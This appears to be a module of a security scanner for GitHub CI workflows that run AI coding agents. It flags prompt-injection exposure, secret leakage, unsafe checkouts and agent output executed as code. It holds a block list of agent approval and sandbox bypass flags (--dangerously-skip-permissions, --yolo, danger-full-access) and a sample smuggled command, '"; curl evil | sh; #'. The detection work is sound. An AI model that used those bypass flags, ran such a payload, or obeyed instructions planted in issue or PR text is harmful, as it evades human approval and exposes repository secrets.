import {
  ACTOR_GATE_RE, MODEL_SECRET_RE, PERMISSION_CHECK_ACTION_RE, PRIVILEGED_UNTRUSTED_TRIGGERS,
  UNPRIVILEGED_UNTRUSTED_TRIGGERS, ciWorkflowModel, untrustedRefs, writerRefs,

} from './ci-workflow.mjs';
import { locate } from './agentic-shim.mjs';

const BYPASS_RULES                                                               = [
  { re: /--dangerously-skip-permissions\b/, label: 'claude --dangerously-skip-permissions', severity: 'HIGH' },
  { re: /--permission-mode[= ]+['"]?bypassPermissions\b/i, label: 'claude --permission-mode bypassPermissions', severity: 'HIGH' },
  { re: /--dangerously-bypass-approvals-and-sandbox\b/, label: 'codex --dangerously-bypass-approvals-and-sandbox', severity: 'HIGH' },
  { re: /(?:--sandbox|(?:^|\s)-s)[= ]+['"]?danger-full-access\b|\bsandbox\s*[:=]\s*['"]?danger-full-access\b/im, label: 'sandbox danger-full-access', severity: 'HIGH' },
  { re: /\bsafety-strategy\s*[:=]\s*['"]?unsafe\b/i, label: 'codex-action safety-strategy: unsafe', severity: 'HIGH' },
  { re: /--approval-mode[= ]+['"]?yolo\b/i, label: '--approval-mode yolo', severity: 'HIGH' },
  { re: /(?:^|\s)--yolo\b/m, label: '--yolo', severity: 'HIGH' },
  { re: /--allow-all-tools\b|(?:^|\s)--allow-all\b/m, label: 'copilot --allow-all-tools', severity: 'HIGH' },
  { re: /--trust-all-tools\b/, label: '--trust-all-tools', severity: 'HIGH' },
  { re: /--yes-always\b/, label: 'aider --yes-always', severity: 'HIGH' },
  { re: /\b(?:cursor-)?agent\b[^\n]*\s(?:--force|-f)\b/, label: 'cursor agent --force', severity: 'HIGH' },
  { re: /--allowed-?tools[= ]+['"]?[^'"\n]*(?:\bBash\b(?!\()|Bash\(\s*\*?\s*\)|Bash\(\*|["' ,]\*["' ,])/i, label: '--allowedTools with unscoped Bash', severity: 'HIGH' },
  { re: /(?:--ask-for-approval|(?:^|\s)-a)[= ]+['"]?never\b/m, label: 'codex --ask-for-approval never', severity: 'MEDIUM' },
  { re: /--full-auto\b/, label: 'codex --full-auto', severity: 'MEDIUM' },
];

const has = (s                           , re        ) => !!s && new RegExp(re.source, re.flags.replace('g', '')).test(s);
const uniq = (xs          ) => [...new Set(xs)];
const matchesOf = (s        , re        ) => uniq([...s.matchAll(new RegExp(re.source, re.flags.includes('g') ? re.flags : re.flags + 'g'))].map((m) => m[0])).slice(0, 8);

function agentSteps(wf            )           {
  return wf.jobs.flatMap((j) => j.steps.filter((s) => s.ai));
}

function jobOf(wf            , step        )        {
  return wf.jobs.find((j) => j.id === step.job) ;
}

function whoCanFire(wf            , step        )                                                      {
  const job = jobOf(wf, step);
  const gate = [job.if, step.if].find((c) => has(c, ACTOR_GATE_RE));
  if (gate) return { who: 'writers', why: `gated by \`if: ${gate.slice(0, 120)}\`` };
  const earlier = job.steps.filter((s) => s.index < step.index);
  if (earlier.some((s) => has(s.uses, PERMISSION_CHECK_ACTION_RE))) return { who: 'writers', why: 'a permission-check step runs first' };
  const w = step.with;
  if (step.ai?.product === 'claude-code-action') {
    const open = (w.allowed_non_write_users ?? '').trim();
    if (open === '*') return { who: 'open', why: 'allowed_non_write_users: "*" switches off the action\'s write-access check' };
    if (open) return { who: 'actors', why: `allowed_non_write_users lets ${open.slice(0, 80)} fire it without write access` };
    return { who: 'writers', why: 'claude-code-action only runs for actors with write access by default' };
  }
  if (step.ai?.product === 'codex-action') {
    const open = (w['allow-users'] ?? '').trim();
    if (open === '*') return { who: 'open', why: 'allow-users: "*" switches off the action\'s write-access check' };
    if (open) return { who: 'actors', why: `allow-users lets ${open.slice(0, 80)} fire it` };
    return { who: 'writers', why: 'codex-action requires write access by default' };
  }
  return { who: 'open', why: 'no actor condition on the job or step, and the step has no write-access check of its own' };
}

function unattended(step        )                                                                       {
  const out                                                                       =
    BYPASS_RULES.filter((r) => has(step.inputText, r.re)).map(({ label, severity }) => ({ label, severity }));
  if (step.ai?.product === 'run-gemini-cli' && !/"core"\s*:/.test(step.with.settings ?? '')) {
    out.push({ label: 'run-gemini-cli always runs --yolo, and no settings.tools.core allow-list narrows it', severity: 'HIGH', implicit: true });
  }
  if (step.ai?.product === 'ai-inference' && /^true$/i.test((step.with['enable-github-mcp'] ?? '').trim())) {
    out.push({ label: 'ai-inference with enable-github-mcp: true', severity: 'MEDIUM', implicit: true });
  }
  return out;
}

const MODEL_AUTH_INPUTS = new Set(['anthropic_api_key', 'claude_code_oauth_token', 'openai-api-key', 'openai_api_key', 'gemini_api_key', 'google_api_key', 'github_token']);
const PROVIDER_WORD_RE = /OPENAI|ANTHROPIC|CLAUDE|GEMINI|GOOGLE_AI|GOOGLE_GENERATIVE|MISTRAL|GROQ|OPENROUTER|DEEPSEEK|XAI/i;
const isModelAuthInput = (k        ) => MODEL_AUTH_INPUTS.has(k.toLowerCase()) || (PROVIDER_WORD_RE.test(k) && /(?:KEY|TOKEN)$/i.test(k));

const WRITE_TOOL_RE = /\b(?:Write|Edit|MultiEdit|NotebookEdit)\b|\bBash\b(?!\()|Bash\(\s*\*|write_file|replace\b|run_shell_command(?!\()/;

function capabilityOf(step        )                                                          {
  const w = step.with;
  if (step.ai?.kind === 'reviewer') return { level: 'restricted', why: 'a review bot with a fixed tool set' };
  if (step.ai?.product === 'codex-action' && (/read-only/.test(w.sandbox ?? '') || /read-only/.test(w['permission-profile'] ?? '') || /read-only/.test(w['safety-strategy'] ?? ''))) {
    return { level: 'restricted', why: 'codex runs with a read-only sandbox' };
  }
  const settings = w.settings ?? '';
  if (step.ai?.product === 'run-gemini-cli' && /"core"\s*:\s*\[([^\]]*)\]/.test(settings) && !WRITE_TOOL_RE.test(/"core"\s*:\s*\[([^\]]*)\]/.exec(settings) [1])) {
    return { level: 'restricted', why: 'settings.tools.core narrows the Gemini tools' };
  }
  const list = /--allowed-?tools[= ]+(?:"([^"]*)"|'([^']*)'|(\S+))/i.exec(step.inputText) ?? /\ballowed_tools:\s*(.+)/i.exec(step.inputText);
  const tools = list ? (list[1] ?? list[2] ?? list[3] ?? '') : '';
  if (tools && !WRITE_TOOL_RE.test(tools)) return { level: 'restricted', why: `the tool list is limited to ${tools.slice(0, 100)}` };
  return { level: 'default', why: null };
}

const REPO_WRITE_SCOPES = ['contents', 'pull-requests', 'actions', 'packages', 'deployments', 'security-events', 'checks', 'statuses', 'workflows', 'pages'];

function narrowToken(wf            , step        )          {
  const perms = jobOf(wf, step).permissions ?? wf.permissions;
  if (perms === 'read-all' || (perms && typeof perms === 'object' && !Object.keys(perms          ).length)) return true;
  if (!perms || typeof perms !== 'object') return false;
  return !REPO_WRITE_SCOPES.some((k) => (perms                           )[k] === 'write');
}

function triggerFindings(ctx          , step        )                    {
  const { a, privileged } = ctx;
  if (!privileged.length || step.ai?.kind === 'model') return [];
  const fire = whoCanFire(ctx.wf, step);
  if (fire.who === 'writers') return [];
  const flags = unattended(step);
  const cap = capabilityOf(step);
  const narrow = narrowToken(ctx.wf, step);
  const sev = flags.some((f) => f.severity === 'HIGH') && fire.who === 'open' ? 'CRITICAL'
    : fire.who === 'open' && cap.level === 'default' && !narrow ? 'HIGH' : 'MEDIUM';
  return [{
    class: 'PROMPT_INJECTION',
    severity: sev,
    title: `Agent step "${step.id ?? step.ai .product}" in "${a.name}" can be summoned by ${fire.who === 'open' ? 'anyone' : 'named non-writers'} on ${privileged.join(', ')}`,
    detail:
      `${fire.why}. ${privileged.join(', ')} runs in the base repository with its secrets and a write-capable token, and the agent reads the triggering issue, comment or PR itself - so whoever can open one writes part of its instructions, with no \`\${{ }}\` needed in the prompt.` +
      (flags.length
        ? ` The step also runs unattended (${flags.map((f) => f.label).join('; ')}), so an injected instruction executes without review.`
        : cap.why ? ` Its reach is narrowed (${cap.why}), so a steered run is bounded by that list - which is the part to keep tight.`
          : narrow ? ' Its job token can write only issue / discussion content, so a steered run is bounded to what that token and the agent\'s default tools allow.' : ''),
    remediationText:
      'Gate the job on the actor (`author_association` in OWNER/MEMBER/COLLABORATOR, or a permission check) and keep the action\'s write-access check on; give the agent read-only tools and a read-only token for anything it does on untrusted threads.',
    remediationTier: 1,
    evidence: { step: step.id, product: step.ai .product, triggers: privileged, gate: fire.why, capability: cap.why, unattended: flags.map((f) => f.label), path: a.path, ...locate(step.uses ?? step.ai .product, a.content) },
  }];
}

function interpolationFindings(ctx          , step        )                    {
  const { a, privileged, forkOnly } = ctx;
  const untrusted = untrustedRefs(step.inputText);
  const writer = writerRefs(step.inputText);
  if (!untrusted.length && !writer.length) return [];
  const exprs = untrusted.length ? untrusted : writer;

  const narrow = capabilityOf(step).level === 'restricted' && !unattended(step).length;
  const sev                              = !untrusted.length ? 'LOW' : privileged.length ? (narrow ? 'MEDIUM' : 'HIGH') : forkOnly.length ? 'MEDIUM' : 'LOW';
  const onEnv = !exprs.some((e) => (step.run ?? '').includes(e) || Object.values(step.with).some((v) => v.includes(e)));
  return [{
    class: 'PROMPT_INJECTION',
    severity: sev,
    title: `Workflow "${a.name}" feeds ${untrusted.length ? 'attacker-controllable' : 'dispatcher-supplied'} text to agent step "${step.id ?? step.ai .product}"${onEnv ? ' through an environment variable' : ''}`,
    detail:
      `${exprs.slice(0, 4).join(', ')} reach${exprs.length === 1 ? 'es' : ''} the agent${onEnv ? ' through an environment variable' : ''}` +
      (privileged.length && untrusted.length ? `, on ${privileged.join(', ')} - a trigger that carries repository secrets and a write-scoped token` : '') +
      '. An environment variable stops SHELL injection; it does not stop PROMPT injection - the agent still reads the text as part of its task, and anyone who can write it can write instructions.',
    remediationText:
      'Do not put issue, comment, PR or commit text in the prompt of an agent that holds secrets or write tools. If it must read untrusted text, run it read-only with no secrets beyond the model key, and treat its output as untrusted data.',
    remediationTier: 1,
    evidence: { expressions: exprs, step: step.id, product: step.ai .product, triggers: ctx.wf.triggers, viaEnv: onEnv, path: a.path, ...locate(exprs[0], a.content) },
  }];
}

function bypassFindings(ctx          , step        )                    {
  const flags = unattended(step);
  if (!flags.length) return [];
  const exposed = ctx.privileged.length > 0 || untrustedRefs(step.inputText).length > 0;
  const top = flags.find((f) => f.severity === 'HIGH') ?? flags[0];
  return [{
    class: 'INSECURE_CONFIG',

    severity: top.severity === 'HIGH' ? (exposed ? 'CRITICAL' : flags.every((x) => x.implicit) ? 'MEDIUM' : 'HIGH') : 'MEDIUM',
    title: `Workflow "${ctx.a.name}" runs an agent with approvals disabled`,
    detail:
      `Agent step "${step.id ?? step.ai .product}" uses ${flags.map((f) => f.label).join('; ')}. In CI there is no human to approve anything, so the agent executes whatever it decides, with the runner's credentials and network` +
      (exposed ? ' - on a workflow that attacker-authored text reaches, so an injected instruction executes unreviewed.' : '.'),
    remediationText: 'Remove the bypass and give the CI agent an explicit allow-list of narrow tools (e.g. `Bash(npm test)`, `gh pr comment`), with the sandbox on.',
    remediationTier: 1,
    evidence: { flags: flags.map((f) => f.label), step: step.id, triggers: ctx.wf.triggers, path: ctx.a.path, ...locate(flagNeedle(step, flags[0].label), ctx.a.content) },
  }];
}

function flagNeedle(step        , label        )                  {
  const rule = BYPASS_RULES.find((r) => r.label === label);
  return rule ? rule.re : step.uses ?? label;
}

const UNTRUSTED_CHECKOUT_RE = /github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(?:sha|branch)|refs\/pull\/|\bpull\/\$\{\{/i;

function checkoutFindings(ctx          , step        )                    {
  const triggers = ctx.wf.triggers.filter((t) => t === 'pull_request_target' || t === 'workflow_run' || t === 'issue_comment');
  if (!triggers.length) return [];
  const job = jobOf(ctx.wf, step);
  const checkout = job.steps.find((s) => s.index < step.index && (
    (has(s.uses, /^actions\/checkout\b/i) && has(s.with.ref ?? '', UNTRUSTED_CHECKOUT_RE)) ||
    has(s.run, /\bgh\s+pr\s+checkout\b|git\s+(?:fetch|checkout)[^\n]*(?:refs\/pull\/|\bpull\/|github\.event\.pull_request\.head)/i)
  ));
  if (!checkout) return [];
  return [{
    class: 'PROMPT_INJECTION',
    severity: 'CRITICAL',
    title: `Workflow "${ctx.a.name}" runs an agent on a pull request's own code with base-repo secrets`,
    detail:
      `On ${triggers.join(', ')}, step ${checkout.index + 1} checks out the PR head before agent step "${step.id ?? step.ai .product}". The agent then loads that tree's CLAUDE.md / AGENTS.md / .cursor rules, .mcp.json servers and settings as its own configuration - all authored by whoever opened the PR - while holding the base repository's secrets and write token.`,
    remediationText:
      'Run agents that must see PR code on `pull_request` (fork: no secrets), or check the PR out into a subdirectory the agent does not treat as its project root, with project instruction files, MCP config and hooks disabled.',
    remediationTier: 1,
    evidence: { triggers, checkoutStep: checkout.index + 1, step: step.id, path: ctx.a.path, ...locate(checkout.with.ref ?? 'gh pr checkout', ctx.a.content) },
  }];
}

function outputFindings(ctx          , step        )                    {
  if (!step.id) return [];
  const job = jobOf(ctx.wf, step);
  const ref = new RegExp(String.raw`\$\{\{[^}]*\bsteps\.${step.id.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\.outputs\.[\w-]+[^}]*\}\}`);
  const sink = job.steps.find((s) => s.index > step.index && (has(s.run, ref) || (has(s.uses, /^actions\/github-script\b/) && has(s.with.script, ref))));
  if (!sink) return [];
  const expr = ((sink.run ?? sink.with.script ?? '').match(ref) ?? [''])[0];
  return [{
    class: 'INJECTION_FLAW',
    severity: 'HIGH',
    title: `Workflow "${ctx.a.name}" executes the agent's output as code`,
    detail: `${expr} is interpolated into ${sink.run ? 'a `run:` script' : 'a github-script body'} (step ${sink.index + 1}). The expression is substituted before the shell parses it, so whatever the model returns - including text an injected instruction made it return - runs as a command with the job's token.`,
    remediationText: 'Pass the agent output through an environment variable and treat it as data (quote it, validate it against an expected shape); never splice it into a script.',
    remediationTier: 1,
    evidence: { expression: expr, producer: step.id, sinkStep: sink.index + 1, path: ctx.a.path, ...locate(expr, ctx.a.content) },
  }];
}

function reachFindings(ctx          , step        )                    {
  const out                    = [];
  const job = jobOf(ctx.wf, step);
  const perms = job.permissions ?? ctx.wf.permissions;

  if (perms === 'write-all' && (ctx.privileged.length || ctx.forkOnly.length)) {
    out.push({
      class: 'OVER_PERMISSIONED',
      severity: 'MEDIUM',
      title: `Agent job "${job.id}" in "${ctx.a.name}" holds a write-all token`,
      detail: `The job that runs the agent on ${[...ctx.privileged, ...ctx.forkOnly].join(', ')} is granted \`permissions: write-all\`. Anything an injected instruction makes the agent do, it does with that reach.`,
      remediationText: 'Declare the minimum per-job permissions the agent needs (usually contents: read plus one write scope it posts with).',
      remediationTier: 2,
      evidence: { job: job.id, permissions: perms, path: ctx.a.path, ...locate('write-all', ctx.a.content) },
    });
  }

  const holders = [...Object.entries(step.env), ...Object.entries(step.with)].filter(([k]) => !isModelAuthInput(k)).map(([, v]) => v);
  const secrets = uniq(matchesOf(holders.join('\n'), /\$\{\{\s*secrets\.([\w-]+)\s*\}\}/g).map((m) => /secrets\.([\w-]+)/.exec(m) [1]))
    .filter((s) => !MODEL_SECRET_RE.test(s));
  if (secrets.length && (ctx.privileged.length || untrustedRefs(step.inputText).length > 0)) {
    out.push({
      class: 'TOXIC_FLOW',
      severity: 'HIGH',
      title: `Agent step "${step.id ?? step.ai .product}" in "${ctx.a.name}" holds secrets beyond its model key`,
      detail: `${secrets.slice(0, 6).join(', ')} ${secrets.length === 1 ? 'is' : 'are'} handed to an agent that attacker-authored text reaches. The model key is the one credential it needs; every other secret in its environment is something an injected instruction can print into a comment, a branch or a request.`,
      remediationText: 'Give the agent step only the model credential and the default GITHUB_TOKEN; run anything that needs other secrets in a separate job that consumes the agent\'s output as data.',
      remediationTier: 1,
      evidence: { secrets, step: step.id, path: ctx.a.path, ...locate(`secrets.${secrets[0]}`, ctx.a.content) },
    });
  }
  if (step.ai?.product === 'claude-code-action' && (step.with.allowed_bots ?? '').trim() === '*') {
    out.push({
      class: 'WEAK_AUTH',
      severity: 'MEDIUM',
      title: `claude-code-action in "${ctx.a.name}" accepts any bot`,
      detail: '`allowed_bots: "*"` lets any GitHub App fire the agent with a prompt it controls, and allowed bots are not checked for repository permissions.',
      remediationText: 'List the specific bots that may trigger the agent.',
      remediationTier: 2,
      evidence: { path: ctx.a.path, ...locate('allowed_bots', ctx.a.content) },
    });
  }
  return out;
}

function scriptInjectionFindings(a                  , wf            , privileged          )                    {
  if (wf.vendor !== 'github' || !privileged.length) return [];
  const out                    = [];
  for (const s of wf.jobs.flatMap((j) => j.steps)) {
    if (s.ai || !s.run) continue;
    const exprs = untrustedRefs(s.run);
    if (!exprs.length) continue;
    out.push({
      class: 'INJECTION_FLAW',
      severity: 'HIGH',
      title: `Workflow "${a.name}" splices attacker text into a shell script`,
      detail: `${exprs.slice(0, 3).join(', ')} is interpolated directly into a \`run:\` script on ${privileged.join(', ')}. The expression is substituted before bash parses the line, so a title such as \`"; curl evil | sh; #\` runs with the job's secrets.`,
      remediationText: 'Pass the value through `env:` and reference it as "$VAR" in the script.',
      remediationTier: 1,
      evidence: { expressions: exprs, path: a.path, ...locate(exprs[0], a.content) },
    });
    if (out.length >= 5) break;
  }
  return out;
}

export function agenticCiFindings(a                  )                    {
  const wf = ciWorkflowModel(a.path, a.content ?? '');
  if (!wf) return [];
  const privileged = wf.triggers.filter((t) => PRIVILEGED_UNTRUSTED_TRIGGERS.has(t));
  const forkOnly = wf.triggers.filter((t) => UNPRIVILEGED_UNTRUSTED_TRIGGERS.has(t));
  const ctx           = { a, wf, privileged, forkOnly };
  const out                    = [];
  for (const step of agentSteps(wf).slice(0, 20)) {
    out.push(
      ...triggerFindings(ctx, step), ...interpolationFindings(ctx, step), ...bypassFindings(ctx, step),
      ...checkoutFindings(ctx, step), ...outputFindings(ctx, step), ...reachFindings(ctx, step),
    );
  }
  out.push(...scriptInjectionFindings(a, wf, privileged));
  return dedupe(out);
}

function dedupe(fs                   )                    {
  const seen = new Set        ();
  return fs.filter((f) => {
    const k = `${f.class}|${f.title}`;
    if (seen.has(k)) return false;
    seen.add(k);
    return true;
  });
}

export { ciWorkflowModel };

